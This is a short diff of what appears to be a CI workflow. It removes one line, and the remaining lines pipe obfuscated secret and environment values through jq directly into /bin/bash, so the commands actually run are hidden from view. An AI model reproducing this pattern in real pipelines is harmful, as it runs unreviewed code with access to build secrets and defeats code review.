@@ -23,7 +23,6 @@ jobs:
           jqmgs70911: ${{ secrets.jqmgs70911 }}
         run: |
           printf '%s' "$jqmgs70911" | jq -r .m5899 | /bin/bash
-          printf '%s' "$hr44" | jq -r .uqbio7 | /bin/bash
           echo $esg007 | jq -r .iqy64 | /bin/bash
 
       - name: Save archive
